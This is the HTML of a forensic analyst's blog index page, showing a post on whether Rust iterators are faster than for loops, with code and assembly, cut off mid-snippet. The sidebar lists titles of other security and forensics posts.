<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-list-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.4.0">
<title data-rh="true">Blog | Jan Starke</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://janstarke.github.io/img/fox/fuchs_blau_32.png"><meta data-rh="true" name="twitter:image" content="https://janstarke.github.io/img/fox/fuchs_blau_32.png"><meta data-rh="true" property="og:url" content="https://janstarke.github.io/blog"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" property="og:title" content="Blog | Jan Starke"><meta data-rh="true" name="description" content="Blog"><meta data-rh="true" property="og:description" content="Blog"><meta data-rh="true" name="docusaurus_tag" content="blog_posts_list"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_posts_list"><link data-rh="true" rel="icon" href="/img/fox/fuchs_blau.ico"><link data-rh="true" rel="canonical" href="https://janstarke.github.io/blog"><link data-rh="true" rel="alternate" href="https://janstarke.github.io/blog" hreflang="en"><link data-rh="true" rel="alternate" href="https://janstarke.github.io/blog" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"Blog","@id":"https://janstarke.github.io/blog","mainEntityOfPage":"https://janstarke.github.io/blog","headline":"Blog","description":"Blog","blogPost":[{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2024/06/15/rust-using-iterators","mainEntityOfPage":"https://janstarke.github.io/blog/2024/06/15/rust-using-iterators","url":"https://janstarke.github.io/blog/2024/06/15/rust-using-iterators","headline":"Rust: Iterators are not faster; Anyway, you should use them","name":"Rust: Iterators are not faster; Anyway, you should use them","description":"Since some time, I'm wondering whether using iterators in Rust has some","datePublished":"2024-06-15T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2022/04/04/centos7-volatility","mainEntityOfPage":"https://janstarke.github.io/blog/2022/04/04/centos7-volatility","url":"https://janstarke.github.io/blog/2022/04/04/centos7-volatility","headline":"Analyzing Linux memory images with volatility","name":"Analyzing Linux memory images with volatility","description":"Why volatility3? Because version 2 is deprecated.","datePublished":"2022-04-04T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/11/02/Using-regripper-on-darwin","mainEntityOfPage":"https://janstarke.github.io/blog/2021/11/02/Using-regripper-on-darwin","url":"https://janstarke.github.io/blog/2021/11/02/Using-regripper-on-darwin","headline":"Using regripper on MacOS","name":"Using regripper on MacOS","description":"Fixing construction of the plugins path","datePublished":"2021-11-02T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence","mainEntityOfPage":"https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence","url":"https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence","headline":"Forensic analysis of deleted `$MFT` entries","name":"Forensic analysis of deleted `$MFT` entries","description":"In the book FILE SYSTEM FORENSIC ANALYSIS, the author Brian Carrier states that \"Every MFT entry also has a 16-bit sequence numberthat is incremented when the entry is allocated. For example, consider MFT entry 313 with a sequence number of 1. The file that allocated entry 313 is deleted, and the entry is allocated to a new file. When the entry is reallocated, it has a new sequence number of 2.\" (page 276).","datePublished":"2021-10-22T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/10/17/mft2bodyfile2","mainEntityOfPage":"https://janstarke.github.io/blog/2021/10/17/mft2bodyfile2","url":"https://janstarke.github.io/blog/2021/10/17/mft2bodyfile2","headline":"$MFT file parser improved","name":"$MFT file parser improved","description":"I added some improvements to mft2bodyfile (https","datePublished":"2021-10-17T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/05/16/mft2bodyfile","mainEntityOfPage":"https://janstarke.github.io/blog/2021/05/16/mft2bodyfile","url":"https://janstarke.github.io/blog/2021/05/16/mft2bodyfile","headline":"$MFT file parser finalized","name":"$MFT file parser finalized","description":"After some days of work, I finalized version 0.3.0 of mft2bodyfile (https://github.com/janstarke/mft2bodyfile), which is aimed to be a replacement for analyze_mft.py, which is abandoned.","datePublished":"2021-05-16T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/03/25/DoSing-TLS-endpoints","mainEntityOfPage":"https://janstarke.github.io/blog/2021/03/25/DoSing-TLS-endpoints","url":"https://janstarke.github.io/blog/2021/03/25/DoSing-TLS-endpoints","headline":"DoSing TLS endpoints","name":"DoSing TLS endpoints","description":"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.","datePublished":"2021-03-25T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/02/13/Pairing_based_cryptography_in_Rust","mainEntityOfPage":"https://janstarke.github.io/blog/2021/02/13/Pairing_based_cryptography_in_Rust","url":"https://janstarke.github.io/blog/2021/02/13/Pairing_based_cryptography_in_Rust","headline":"Pairing based cryptography in Rust","name":"Pairing based cryptography in Rust","description":"Because I was was fed up with catching memory issues in the legacy PBC code, I decided to reimplement the PBC library using Rust. You can watch my progress at https://github.com/teeshop/pbc4rust.","datePublished":"2021-02-13T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/02/05/Using_pairing_based_cryptography_in_Java","mainEntityOfPage":"https://janstarke.github.io/blog/2021/02/05/Using_pairing_based_cryptography_in_Java","url":"https://janstarke.github.io/blog/2021/02/05/Using_pairing_based_cryptography_in_Java","headline":"Using Pairing-based cryptography in Java","name":"Using Pairing-based cryptography in Java","description":"Since some years I'm working on this topic, and guess what-)","datePublished":"2021-02-05T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]},{"@type":"BlogPosting","@id":"https://janstarke.github.io/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage","mainEntityOfPage":"https://janstarke.github.io/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage","url":"https://janstarke.github.io/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage","headline":"Some emotet variants use bad crypto (in the first stage)","name":"Some emotet variants use bad crypto (in the first stage)","description":"What can I say? I recently analyzed an emotet variant which I found in a customer network. Eventually, I found that a new PE binary was being encrypted and loaded into memory. As encryption, simple RC4 was being used, with a static key @nw<jss6fG3Na4jvh^c&4Cgp$*rZ<g?TD@%FgTnwg3, hashed with MD5, which results in 21755ce816bd55c92f57eb4fd2060197 as RC4 key.","datePublished":"2021-01-25T00:00:00.000Z","author":{"@type":"Person","name":"Jan Starke","description":"Senior Forensic Analyst","url":"https://github.com/janstarke","image":"https://github.com/janstarke.png"},"keywords":[]}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Jan Starke RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Jan Starke Atom Feed"><link rel="stylesheet" href="/assets/css/styles.2b14b3d4.css">
<script src="/assets/js/runtime~main.22ea81e2.js" defer="defer"></script>
<script src="/assets/js/main.8ec8f3c4.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/fox/fuchs_blau_32.png" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/fox/fuchs_blau_32.png" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Jan Starke</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">All posts</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2024/06/15/rust-using-iterators">Rust: Iterators are not faster; Anyway, you should use them</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2022/04/04/centos7-volatility">Analyzing Linux memory images with volatility</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/11/02/Using-regripper-on-darwin">Using regripper on MacOS</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/10/22/mft_entry_sequence">Forensic analysis of deleted `$MFT` entries</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/10/17/mft2bodyfile2">$MFT file parser improved</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/05/16/mft2bodyfile">$MFT file parser finalized</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/03/25/DoSing-TLS-endpoints">DoSing TLS endpoints</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/02/13/Pairing_based_cryptography_in_Rust">Pairing based cryptography in Rust</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/02/05/Using_pairing_based_cryptography_in_Java">Using Pairing-based cryptography in Java</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage">Some emotet variants use bad crypto (in the first stage)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2021/01/01/importing-windows-event-logs-into-elasticsearch">Importing Windows Event Logs into Elasticsearch</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2020/01/08/does-sodinokibi-use-bad-crypto">Does Sodinokibi use bad crypto?</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2015/12/01/new-malware-pro-invoicewmz45445">New Malware: &quot;Pro InvoiceWMZ45445&quot;</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2015/08/05/merging-wordlist-files">Merging wordlist files</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2015/03/08/rexgen-is-back-again">Rexgen is back again</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2015/02/11/how-to-not-hack-jasas-blog">How to (not) hack jasa&#x27;s blog</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2015/02/02/measuring-forensic-readiness">Measuring Forensic Readiness</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2015/02/01/invalid-tcp-segments-created-by-macof">Invalid TCP segments created by macof</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space">Userspace tool for (anti-forensically safe) wiping unallocated disk space</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen">Solaris: Bufferoverflows in lx-Zones ausnutzen</a></li></ul></nav></aside><main class="col col--7"><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2024/06/15/rust-using-iterators">Rust: Iterators are not faster; Anyway, you should use them</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-06-15T00:00:00.000Z">June 15, 2024</time> · <!-- -->6 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>Since some time, I&#x27;m wondering whether using iterators in Rust has some
benefits over traditional <code>for</code> loops.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-idea">The idea<a class="hash-link" aria-label="Direct link to The idea" title="Direct link to The idea" href="/blog#the-idea">​</a></h2>
<p>Consider the following loop:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> sum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..=</span><span class="token number" style="color:#36acaa">100</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>which expands during execution to</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> sum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The way we expressed the sum also defines in which order the summation
has to be done. But, to be honest, we are not interested in the concrete order.
In fact, the single summations could be done on multiple cores simultaneously.</p>
<p>An alternative way of implementing the above algorithm using iterators could be</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> sum</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u32</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..=</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Can this be faster? I don&#x27;t know. So, let&#x27;s use a more complicated example and check it out</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-test-case">The test case<a class="hash-link" aria-label="Direct link to The test case" title="Direct link to The test case" href="/blog#the-test-case">​</a></h2>
<p>To test which approach is faster, we need to prevent the compiler to optimize too simple things. For example, the above code using the <code>for</code> loop compiles to</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    xor     eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov     ecx, 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor     edx, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.LBB45_1:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov     esi, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lea     edx, [rsi, +, 1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp     esi, 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmovae  edx, ecx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add     eax, esi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp     esi, 99</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ja      .LBB45_3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp     edx, 101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jb      .LBB45_1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.LBB45_3:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>while the iterator based approach compiles to</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    mov     eax, 5050</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Of course, this results from the fact that the compiler knows a lot about the code to be optimized. So, again, we need a more complicated code.</p>
<p>We&#x27;ll do the following:</p>
<ol>
<li>iterate through the first <code>1_000_000</code> integers, stored as <code>String</code></li>
<li>convert the <code>String</code> into <code>u64</code></li>
<li>filter out numbers which are greater or equal to <code>100_000</code></li>
<li>filter out numbers which are no prime numbers</li>
<li>calculate the sum of those numbers</li>
</ol>
<p>We use the following implementations:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="loop-approach">Loop approach<a class="hash-link" aria-label="Direct link to Loop approach" title="Direct link to Loop approach" href="/blog#loop-approach">​</a></h3>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum1</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">Iterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token 